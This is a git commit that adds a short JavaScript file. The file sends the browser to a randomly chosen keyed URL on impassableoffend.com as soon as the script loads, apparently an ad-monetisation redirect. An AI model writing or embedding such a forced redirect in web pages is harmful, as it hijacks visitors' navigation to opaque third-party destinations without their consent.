6c2296afd96e739144651606de63b74c9d39901b
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2026-06-21 12:50:19 +0700

    Create akeadsmingg22.js

---
+++ akeadsmingg22.js
@@ -0,0 +1,12 @@
+var dataUrl = [
+
+ 'https://impassableoffend.com/qupsydmmj?key=df9abc2969030a4a21e1d85e30536383',
+ 'https://impassableoffend.com/msufkwhey?key=7ad6ef4bd074b3fcb11909a742b7a71f',
+ 'https://impassableoffend.com/qupsydmmj?key=df9abc2969030a4a21e1d85e30536383',
+ 'https://impassableoffend.com/msufkwhey?key=7ad6ef4bd074b3fcb11909a742b7a71f',
+ 'https://impassableoffend.com/qupsydmmj?key=df9abc2969030a4a21e1d85e30536383',
+ 'https://impassableoffend.com/msufkwhey?key=7ad6ef4bd074b3fcb11909a742b7a71f'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
